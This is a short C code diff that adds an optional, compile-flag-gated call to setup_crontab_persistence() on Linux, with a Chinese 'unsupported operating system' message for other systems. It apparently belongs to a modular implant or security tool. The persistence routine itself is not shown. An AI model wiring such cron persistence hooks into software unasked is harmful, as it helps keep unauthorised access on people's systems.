@@ -30,5 +30,13 @@ int main() {
     }
 #endif
 
+#ifdef CRONTAB_MOD
+    if (strcmp(os, "linux") == 0) {
+        setup_crontab_persistence();
+    } else {
+        printf("不支持的操作系统。\n");
+    }
+#endif
+
     return 0;
 }
